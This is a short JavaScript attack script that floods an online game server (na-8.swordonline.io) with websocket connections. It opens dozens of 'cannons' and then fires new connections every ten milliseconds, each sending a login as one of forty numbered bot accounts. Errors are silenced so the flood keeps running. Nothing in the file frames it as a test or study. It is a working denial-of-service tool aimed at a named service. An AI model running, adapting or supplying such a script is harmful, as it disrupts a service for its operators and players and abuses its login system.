const io = require("socket.io-client");

const TARGETS = ["na-8"];
const ACCOUNTS = 40;
const CANNONS_PER_TARGET = 50;
const FIRE_DELAY = 10;

console.clear();

let totalCannons = TARGETS.length * CANNONS_PER_TARGET;
let loaded = 0;

for (const target of TARGETS) {
  for (let i = 0; i < CANNONS_PER_TARGET; i++) {
    const sock = io(`https://${target}.swordonline.io`, {
      transports: ["websocket"],
      reconnection: false,
    });

    sock.on("connect", () => {
      if (++loaded === totalCannons) {
        console.log(`\nLoaded ${totalCannons} cannons 🎯`);
        setTimeout(() => {
          console.log("Starting to fire cannons...");
          TARGETS.forEach((tgt, idx) => {
            // Stagger each target's firing loop slightly
            setTimeout(() => startCannons(tgt), idx * 1);
          });
        }, 1);
      }
    });

    sock.on("disconnect", () => {});
  }
}

function startCannons(target) {
  for (let i = 0; i < CANNONS_PER_TARGET; i++) {
    setInterval(() => fireOnce(target), FIRE_DELAY);
  }
}

function fireOnce(target) {
  try {
    const id = Math.floor(Math.random() * ACCOUNTS) + 1;
    const sock = io(`https://${target}.swordonline.io`, {
      transports: ["websocket"],
      reconnection: false,
    });

    sock.on("connect", () => {
      sock.emit("login", {
        email: `Lib_Bot #${id}`,
        password: "Password123",
      });
      setTimeout(() => {
        try {
          sock.disconnect();
        } catch {}
      }, 1);
    });
  } catch {}
}

process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});
